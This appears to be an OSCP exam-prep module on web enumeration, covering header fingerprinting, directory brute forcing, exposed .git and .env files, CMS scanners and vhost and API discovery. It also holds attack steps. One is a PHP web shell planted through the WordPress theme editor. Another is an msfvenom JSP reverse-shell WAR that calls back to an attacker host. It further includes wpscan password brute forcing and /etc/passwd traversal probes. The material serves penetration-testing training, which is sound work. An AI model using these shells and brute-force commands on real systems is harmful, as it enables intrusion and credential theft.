# 03 — Web Enumeration

Web enumeration is the process of discovering everything a web server is hiding — directories, files, login pages, APIs, CMS installations, backup files, and developer mistakes. On the OSCP, at least half your machines will have a web-based foothold. How thoroughly you enumerate determines whether you find it or spend hours stuck.

This module covers every tool and technique for web enumeration, with every flag explained and every concept broken down.

---

## Step 1: What's running on the web server?

Before brute forcing directories, understand what you're dealing with.

### curl — check headers and content

```bash
curl -I http://TARGET
```

`curl` makes HTTP requests from the command line. The `-I` flag means "send a HEAD request" — the server responds with only the headers (no page content). This is fast and tells you a lot.

**Example output:**

```
HTTP/1.1 200 OK
Date: Thu, 31 Jul 2026 14:30:00 GMT
Server: Apache/2.4.57 (Debian)
X-Powered-By: PHP/8.1.2
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=abc123; path=/
```

**What each header tells you:**

| Header | What it reveals | What to do with it |
|---|---|---|
| `Server: Apache/2.4.57 (Debian)` | Exact web server software and OS | `searchsploit apache 2.4.57` — check for CVEs |
| `X-Powered-By: PHP/8.1.2` | The backend language and version | `searchsploit php 8.1` — also tells you file extensions are `.php` |
| `Set-Cookie: PHPSESSID` | It's PHP (PHPSESSID is PHP's default session cookie name) | Test for PHP vulnerabilities, use `.php` extensions in gobuster |
| `Content-Type: text/html` | The page returns HTML | Normal web page |

**Other cookies that reveal the technology:**

```
PHPSESSID=...          → PHP
JSESSIONID=...         → Java (Tomcat, Spring, JBoss)
ASP.NET_SessionId=...  → ASP.NET (Microsoft IIS)
connect.sid=...        → Node.js (Express)
csrftoken=...          → Django (Python)
_rails_session=...     → Ruby on Rails
```

### whatweb — automatic fingerprinting

```bash
whatweb http://TARGET
```

**What whatweb does:** Sends requests to the target and analyzes the response to identify the web server, CMS, frameworks, JavaScript libraries, analytics tools, and more. It checks HTTP headers, HTML content, cookies, and specific file paths.

**Example output:**

```
http://192.168.244.132 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], 
HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[192.168.244.132], 
JQuery[3.6.0], PHP[8.1.2], Title[Company Portal], WordPress[6.2.1]
```

This single command tells you: Apache 2.4.57, Debian, PHP 8.1.2, jQuery 3.6.0, WordPress 6.2.1. Each of these is searchable in searchsploit for known vulnerabilities.

### View the page source — ALWAYS do this

```bash
# Download the raw HTML
curl -s http://TARGET

# Search for interesting content in the source
curl -s http://TARGET | grep -iE "<!--.*-->|password|admin|user|key|secret|config|debug|todo|hack|flag|hidden|token|api|internal|backup"
```

**Why this matters:** Developers leave HTML comments with debug info, hidden paths, TODO notes, and sometimes credentials. The browser hides comments — you only see them in the source.

**Real examples found in HTML source:**

```html
<!-- TODO: remove test credentials admin:admin123 -->
<!-- Debug: API endpoint at /api/v2/users -->
<!-- Backup of old site at /backup/ -->
<!-- <a href="/admin">Admin Panel</a> -->
<input type="hidden" name="role" value="user">
<input type="hidden" name="debug" value="false">
```

Hidden form fields like `role=user` can sometimes be changed to `role=admin` using Burp Suite.

---

## Step 2: Directory and File Discovery

### What directory brute forcing does

Web servers don't show you every page and directory they have. There's no "table of contents." Directory brute forcing works by trying thousands of common directory and file names and checking which ones exist:

```
Try: http://TARGET/admin       → 200 OK (exists!)
Try: http://TARGET/backup      → 200 OK (exists!)
Try: http://TARGET/config      → 404 Not Found (doesn't exist)
Try: http://TARGET/uploads     → 301 Redirect (exists — it's a directory)
Try: http://TARGET/login.php   → 200 OK (exists!)
Try: http://TARGET/test.php    → 403 Forbidden (exists but blocked!)
... thousands more attempts
```

### gobuster — fast, reliable, the standard tool

```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
```

**What gobuster is:** A tool written in Go that brute forces directories and files on web servers. It's fast because Go handles concurrency well — it sends many requests simultaneously.

**Breaking down the command:**

```
gobuster          The tool
dir               Mode: directory/file brute forcing
                  (other modes: dns for subdomain brute force, vhost for virtual hosts)
-u http://TARGET  The target URL to scan
-w wordlist.txt   The wordlist — a text file with one path per line
```

**The wordlist is everything.** gobuster only tries paths that are in the wordlist. If the hidden directory is called `/secret-admin-panel/` and that exact string isn't in your wordlist, gobuster won't find it. That's why you sometimes need to try multiple wordlists.

### gobuster flags explained

```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -o results.txt -t 50 -s "200,204,301,302,307,401,403" -b "404" --no-error -a "Mozilla/5.0"
```

| Flag | What it does | Why you need it |
|---|---|---|
| `dir` | Directory brute force mode | Tells gobuster what kind of scan |
| `-u URL` | Target URL | The web server to scan |
| `-w wordlist` | Path to the wordlist file | Each line is a path to try |
| `-x php,txt,html,bak` | File extensions to append | Tries each word WITH and WITHOUT each extension. Without this, you miss files like `config.php` or `notes.txt` |
| `-o results.txt` | Save output to file | So you don't lose results |
| `-t 50` | Number of threads (concurrent requests) | Higher = faster, but might overwhelm the server. Default is 10. |
| `-s "200,301,403"` | Status codes to show | Only display results with these HTTP status codes |
| `-b "404"` | Status codes to hide | Don't show 404s (they clutter output) |
| `--no-error` | Suppress connection errors | Clean output when some requests fail |
| `-a "Mozilla/5.0"` | Custom User-Agent header | Some servers block the default gobuster agent |
| `-k` | Skip TLS certificate verification | Needed for HTTPS with self-signed certs |
| `-r` | Follow redirects | Follows 301/302 redirects instead of just reporting them |

### Extension selection — why it's critical

Without `-x`, gobuster only tries directory names:
```
http://TARGET/admin           ← found
http://TARGET/admin.php       ← NOT tried (missed!)
http://TARGET/config          ← found (directory)
http://TARGET/config.php      ← NOT tried (missed!)
http://TARGET/config.php.bak  ← NOT tried (missed!)
```

With `-x php,txt,bak`:
```
http://TARGET/admin           ← tried
http://TARGET/admin.php       ← tried
http://TARGET/admin.txt       ← tried
http://TARGET/admin.bak       ← tried
http://TARGET/config          ← tried
http://TARGET/config.php      ← tried ← FOUND credentials!
http://TARGET/config.txt      ← tried
http://TARGET/config.bak      ← tried
http://TARGET/config.php.bak  ← NOT tried (only appends one extension)
```

**Choose extensions based on the technology:**

| Technology | Extensions to use |
|---|---|
| PHP (Apache/Nginx on Linux) | `-x php,php.bak,txt,html,bak,old,conf,xml,inc,log` |
| ASP.NET (IIS on Windows) | `-x asp,aspx,txt,html,bak,config,xml` |
| Java (Tomcat) | `-x jsp,txt,html,xml,war,jar` |
| Python (Flask/Django) | `-x py,txt,html,json,cfg` |
| Node.js | `-x js,json,txt,html,env` |
| Don't know | `-x php,asp,aspx,jsp,txt,html,bak,old,conf,xml,json` |

### Wordlists — which one to use

Gobuster is only as good as its wordlist. Start small and fast, escalate to bigger lists if needed.

```bash
# TIER 1: Quick scan (4,614 entries — takes seconds)
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt

# TIER 2: Medium scan (220,560 entries — takes minutes)
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt

# TIER 3: Large scan (1,273,833 entries — takes a long time)
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt -x php,txt

# TIER 4: SecLists (alternative comprehensive lists)
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

**Strategy:** Start with TIER 1. If you find nothing interesting, move to TIER 2. You rarely need TIER 3 unless the machine is specifically hiding something deep.

### Understanding HTTP status codes in gobuster output

```
200 OK           → Page exists and is accessible (CHECK IT)
204 No Content   → Page exists but returns empty content (might still be interesting)
301 Moved        → Permanent redirect — usually means it's a DIRECTORY (add a trailing /)
302 Found        → Temporary redirect — might redirect to a login page
307 Temporary    → Same as 302 but preserves the HTTP method
401 Unauthorized → Page exists but requires authentication (try default creds!)
403 Forbidden    → Page exists but access is denied (might be exploitable or needs auth)
404 Not Found    → Page doesn't exist (ignore these)
500 Internal Error → Page exists but is broken (interesting — might be exploitable)
```

**Important:** A 403 doesn't mean "give up." It means the page EXISTS but you're not authorized. Try:
- Adding `/` at the end: `http://TARGET/admin/`
- Different HTTP methods: change GET to POST
- Adding headers: `X-Forwarded-For: 127.0.0.1`
- Path traversal: `http://TARGET/admin../../../etc/passwd`

### feroxbuster — recursive scanning

```bash
feroxbuster -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```
### feroxbuster - output to a txt file

```bash
feroxbuster -u "http://192.168.244.132" -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o feroxbusterscan.txt
```

**What feroxbuster is:** Like gobuster but it scans RECURSIVELY. When it finds a directory like `/admin/`, it automatically scans INSIDE that directory for more content. Gobuster only scans the paths in your wordlist at the root level.

```
Gobuster finds: /admin/ (status 301)
Gobuster: moves on to the next word in the wordlist

Feroxbuster finds: /admin/ (status 301)
Feroxbuster: automatically scans inside /admin/ too:
  /admin/login.php
  /admin/config.php
  /admin/uploads/
  /admin/uploads/shell.php
```

**Key feroxbuster flags:**

| Flag | What it does |
|---|---|
| `-u URL` | Target URL |
| `-w wordlist` | Wordlist file |
| `-x php,txt` | Extensions to append |
| `--depth 3` | Maximum recursion depth (default: 4) |
| `-t 50` | Threads |
| `-o results.txt` | Output file |
| `--no-recursion` | Disable recursive scanning (behaves like gobuster) |
| `-k` | Skip TLS verification |
| `--filter-status 404` | Don't show 404s |

**When to use feroxbuster over gobuster:**
- When you know there are nested directories
- When gobuster found directories but you need to scan inside them
- When you want one scan to cover everything

**When to use gobuster:**
- Quick initial scan
- When you need speed over thoroughness
- DNS and virtual host scanning (feroxbuster doesn't do these)

### dirb — the simple alternative

```bash
dirb http://TARGET
```

**What dirb is:** An older directory brute forcer. Simpler than gobuster — fewer options but works well for a quick check. It uses its own built-in wordlist by default.

```bash
# Default scan (uses /usr/share/dirb/wordlists/common.txt)
dirb http://TARGET

# Custom wordlist
dirb http://TARGET /usr/share/wordlists/dirb/big.txt

# With authentication
dirb http://TARGET -u admin:password

# With a cookie
dirb http://TARGET -c "PHPSESSID=abc123"

# Case-insensitive
dirb http://TARGET -z 10 -i
```

**When to use dirb:** When you want a quick and simple scan with minimal configuration. Good for a first check.

---

## Step 3: Check common files manually

These files often exist but might not be in every wordlist. Check them manually:

```bash
# robots.txt — tells search engines what NOT to index
# Developers hide sensitive paths here — which makes it a MAP for attackers
curl http://TARGET/robots.txt
```

**Example robots.txt:**
```
User-agent: *
Disallow: /admin
Disallow: /backup
Disallow: /internal
Disallow: /api/v1/debug
```

Every `Disallow` line is a path the developers don't want public. Check ALL of them:
```bash
curl http://TARGET/admin
curl http://TARGET/backup
curl http://TARGET/internal
curl http://TARGET/api/v1/debug
```

```bash
# sitemap.xml — site structure for search engines
curl http://TARGET/sitemap.xml
# Lists every page the developers want indexed — might include pages
# that aren't linked from the main page

# .htaccess — Apache configuration (usually blocked, but try)
curl http://TARGET/.htaccess

# .git — exposed git repository (JACKPOT if accessible)
curl http://TARGET/.git/HEAD
# If you see: ref: refs/heads/main → the git repo is exposed!
# You can download the entire source code including commit history

# .env — environment variables (Laravel, Node.js)
curl http://TARGET/.env
# Often contains: DB_PASSWORD=xxx, API_KEY=xxx, SECRET_KEY=xxx

# Backup files of known pages
# If you found /config.php:
curl http://TARGET/config.php.bak
curl http://TARGET/config.php.old
curl http://TARGET/config.php~
curl http://TARGET/config.php.swp
curl http://TARGET/.config.php.swp
# Backup files show the PHP SOURCE CODE (normally PHP gets executed, not displayed)
# A .bak file is treated as plaintext — you see everything including passwords

# phpinfo — PHP configuration dump
curl http://TARGET/phpinfo.php
curl http://TARGET/info.php
# Shows: PHP version, loaded modules, file paths, environment variables
# Reveals the document root (needed for file write attacks)

# Server status pages (Apache)
curl http://TARGET/server-status
curl http://TARGET/server-info
# Shows active connections, requested URLs, client IPs
```

### Exposed .git repository — how to exploit it

If `curl http://TARGET/.git/HEAD` returns content (not 404):

```bash
# Install git-dumper (downloads the entire repo)
pip3 install git-dumper --break-system-packages

# Download the repo
git-dumper http://TARGET/.git/ ./git_dump
cd git_dump

# Now you have the source code. Look through it:
ls -la
cat *.php

# Check commit history — developers often commit secrets then delete them
git log --oneline
# abc1234 Remove database credentials
# def5678 Add database configuration
# ghi9012 Initial commit

# The "Remove database credentials" commit means the PREVIOUS commit had them
git show def5678
# Shows the diff — including the deleted credentials!

# Or view all changes with content
git log -p
# Shows every change in every commit — search for passwords:
git log -p | grep -i "password\|secret\|key\|credential\|token"
```

**Why this is devastating:** Even if developers deleted the credentials from the current code, git remembers EVERYTHING. The full history of every change is downloadable. Deleted secrets are still in older commits.

---

## Step 4: CMS Identification and Scanning

### How to identify the CMS

```bash
# Headers and content often reveal it
curl -s http://TARGET | grep -iE "wordpress|wp-content|drupal|joomla|drupal.js"

# Check specific paths
curl -s http://TARGET/wp-login.php        # WordPress
curl -s http://TARGET/administrator       # Joomla
curl -s http://TARGET/user/login          # Drupal
curl -s http://TARGET/wp-content/         # WordPress themes/plugins directory

# whatweb usually identifies it automatically
whatweb http://TARGET
```

### WordPress — wpscan

WordPress is the most common CMS you'll encounter. It has a massive plugin ecosystem where most vulnerabilities live.

```bash
wpscan --url http://TARGET --enumerate u,p,t,cb
```

**What each enumeration flag does:**

| Flag | What it enumerates | Why it matters |
|---|---|---|
| `u` | Users | Gives you usernames for brute forcing |
| `p` | Plugins | Plugins are the #1 source of WordPress vulnerabilities |
| `t` | Themes | Themes can also be vulnerable |
| `cb` | Config backups | Checks for `wp-config.php.bak` and similar |
| `vp` | Vulnerable plugins only (needs API token) | Shows only plugins with known CVEs |
| `vt` | Vulnerable themes only (needs API token) | Shows only themes with known CVEs |

```bash
# Enumerate everything
wpscan --url http://TARGET --enumerate u,p,t,cb

# Brute force the admin login
wpscan --url http://TARGET -U admin -P /usr/share/wordlists/rockyou.txt
# -U = username(s) to try
# -P = password wordlist

# With multiple usernames (found from enumeration)
wpscan --url http://TARGET -U admin,editor,john -P /usr/share/wordlists/rockyou.txt

# With API token (gives vulnerability details)
wpscan --url http://TARGET --enumerate vp --api-token YOUR_TOKEN
# Get a free API token at wpscan.com (25 requests/day free)
```

**WordPress attack paths after finding credentials:**

```
1. Login to wp-admin
2. Go to Appearance → Theme Editor → edit 404.php
3. Replace the content with: <?php system($_GET['cmd']); ?>
4. Save
5. Access: http://TARGET/wp-content/themes/THEME_NAME/404.php?cmd=whoami
6. You have code execution as www-data
7. Trigger a reverse shell from there
```

### Drupal

```bash
# Check version
curl -s http://TARGET/CHANGELOG.txt | head -5
# Drupal stores its changelog in the web root — often reveals the exact version

# droopescan (Drupal scanner)
droopescan scan drupal -u http://TARGET

# Drupalgeddon2 (CVE-2018-7600) — affects Drupal < 8.5.1
searchsploit drupal 7
searchsploit drupalgeddon
# This is a very common OSCP exploit for Drupal sites
```

### Joomla

```bash
# Check version
curl -s http://TARGET/administrator/manifests/files/joomla.xml | grep version

# joomscan (Joomla scanner)
joomscan -u http://TARGET
# Checks for known vulnerabilities, interesting directories, and version info
```

---

## Step 5: Virtual Host Enumeration

### What virtual hosts are

A single web server can host multiple websites. Each website responds to a different hostname (domain name), but they all share the same IP address. If you only browse by IP (`http://192.168.244.132`), you might see the default page and miss other sites entirely.

```
http://192.168.244.132          → Default page ("Welcome to Apache")
http://corporate.local          → Company website
http://dev.corporate.local      → Development site with debug features
http://admin.corporate.local    → Admin panel
```

All four point to the same IP but serve different content based on the `Host` header in the HTTP request.

### How to find virtual hosts

```bash
# Brute force virtual host names
gobuster vhost -u http://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**What `gobuster vhost` does:** For each word in the wordlist, it sends a request with `Host: WORD.TARGET` and checks if the response is different from the default page. A different response means a different virtual host exists.

```
Request: Host: dev.corporate.local → Response: 200 (different from default) → FOUND
Request: Host: xyz.corporate.local → Response: same as default → not a vhost
Request: Host: admin.corporate.local → Response: 200 (different) → FOUND
```

```bash
# gobuster vhost flags
gobuster vhost -u http://TARGET -w wordlist.txt --append-domain
# --append-domain appends the domain to each word:
# Word "dev" + domain "corporate.local" = tries "dev.corporate.local"

# Without --append-domain, it tries each word AS the full hostname
```

### Adding discovered virtual hosts to /etc/hosts

When you find a virtual host, add it to your `/etc/hosts` file so your browser and tools can access it:

```bash
echo "192.168.244.132 corporate.local dev.corporate.local admin.corporate.local" | sudo tee -a /etc/hosts
```

Now you can browse to `http://dev.corporate.local` in Firefox and it resolves to 192.168.244.132 with the correct Host header.

**On the OSCP:** If nmap shows an SSL certificate with a hostname, or if a web page mentions a domain name, add it to `/etc/hosts` and browse using that hostname. Some web apps only work when accessed by hostname.

---

## Step 6: API Enumeration

### What to look for

Modern web applications often have API endpoints that aren't linked from the UI but contain sensitive functionality:

```bash
# Check common API paths
curl http://TARGET/api
curl http://TARGET/api/v1
curl http://TARGET/api/v2
curl http://TARGET/api/v1/users
curl http://TARGET/api/v1/admin
curl http://TARGET/v1
curl http://TARGET/v2

# Check for API documentation (Swagger/OpenAPI)
curl http://TARGET/swagger
curl http://TARGET/swagger.json
curl http://TARGET/swagger-ui.html
curl http://TARGET/swagger-ui/
curl http://TARGET/api-docs
curl http://TARGET/openapi.json
curl http://TARGET/docs

# Check for GraphQL
curl http://TARGET/graphql
curl -X POST http://TARGET/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'
```

**If you find Swagger/OpenAPI documentation:** This is the developer's API manual. It lists every endpoint, every parameter, and every data model. It's a complete roadmap for attacking the API.

```bash
# Brute force API endpoints
gobuster dir -u http://TARGET/api -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://TARGET/api/v1 -w /usr/share/wordlists/dirb/common.txt
```

---

## Step 7: Technology-Specific Checks

### Apache-specific

```bash
curl http://TARGET/.htaccess
curl http://TARGET/.htpasswd           # might contain username:password_hash
curl http://TARGET/server-status
curl http://TARGET/server-info
curl http://TARGET/cgi-bin/            # CGI scripts → test for Shellshock
```

### IIS-specific (Microsoft)

```bash
curl http://TARGET/web.config          # often contains database connection strings
curl http://TARGET/iisstart.htm
curl http://TARGET/aspnet_client/
```

### Nginx-specific

```bash
curl http://TARGET/nginx_status
# Check for off-by-slash misconfiguration
curl http://TARGET/static../etc/passwd
```

### Tomcat-specific (Java)

```bash
curl http://TARGET:8080/manager        # Tomcat manager (try admin:admin, tomcat:tomcat)
curl http://TARGET:8080/manager/html   # manager web interface
curl http://TARGET:8080/host-manager   # host manager
# Default credentials: tomcat:tomcat, admin:admin, tomcat:s3cret

# If you get access to the manager, upload a WAR file for RCE
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI LPORT=4444 -f war -o shell.war
# Upload shell.war through the manager interface
# Access: http://TARGET:8080/shell/
```

---

## Web Enumeration Checklist

Run through this for EVERY web server you find:

```
□ curl -I http://TARGET (check Server, X-Powered-By, cookies)
□ curl -s http://TARGET (read the page content)
□ curl -s http://TARGET | grep "<!--" (HTML comments)
□ curl -s http://TARGET | grep -i "password\|admin\|key\|secret"
□ whatweb http://TARGET (auto fingerprinting)
□ curl http://TARGET/robots.txt
□ curl http://TARGET/sitemap.xml
□ curl http://TARGET/.git/HEAD
□ curl http://TARGET/.env
□ gobuster with common.txt + extensions (-x php,txt,html,bak)
□ If nothing found → bigger wordlist (directory-list-2.3-medium.txt)
□ If nothing found → try feroxbuster for recursive scanning
□ Check for CMS → run appropriate scanner (wpscan, droopescan, joomscan)
□ Check for virtual hosts → gobuster vhost
□ Check for API endpoints → /api, /api/v1, /swagger
□ Check for backup files of any discovered pages (config.php → config.php.bak)
□ Try default credentials on any login pages
□ Test every input field for injection
□ Document EVERYTHING
```

---

## Exam Tips

1. **Run gobuster with extensions.** Without `-x`, you miss half the content. Always include the appropriate extensions for the technology.

2. **Read the source of EVERY page.** Not just the homepage — every page gobuster finds. HTML comments reveal paths, credentials, and debug info.

3. **Check robots.txt immediately.** It's a free map of hidden content.

4. **Try bigger wordlists.** If common.txt finds nothing, move to medium. The answer might be a directory name that's not in the smaller list.

5. **Check for .git exposure.** `curl http://TARGET/.git/HEAD` takes 2 seconds and can give you the entire source code.

6. **Add hostnames to /etc/hosts.** If you see a domain name in an SSL cert, nmap output, or page content, add it and re-enumerate using the hostname.

7. **Backup files expose source code.** Any `.php` file might have a `.php.bak` or `.php.old` version that shows the raw PHP code (including database passwords).

8. **When stuck, enumerate the web server again.** Different wordlist, different extensions, different tool. The foothold is usually hiding in a directory or file you haven't found yet.
